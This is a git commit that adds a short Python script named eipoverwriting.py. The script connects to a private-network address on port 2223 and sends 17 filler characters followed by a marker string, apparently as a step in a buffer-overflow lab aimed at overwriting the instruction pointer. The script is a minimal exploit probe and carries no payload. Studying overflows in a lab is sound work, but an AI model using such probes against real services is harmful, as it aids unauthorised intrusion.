de9dbc0477af8bc3c1f2010e0c76dd9c3f63b9a3
bvillano05 <bvillano05@gmail.com>
2024-12-13 16:47:46 -0500

    Create eipoverwriting.py

---
+++ eipoverwriting.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python3
+
+import socket
+
+def main():
+    IP = "192.168.192.167"
+    PORT = 2223
+
+    garbage = "1" * 17
+    name = "BRAE"
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.connect((IP, PORT))
+    sock.send(garbage.encode() + name.encode())
+
+if __name__ == "__main__":
+    main()
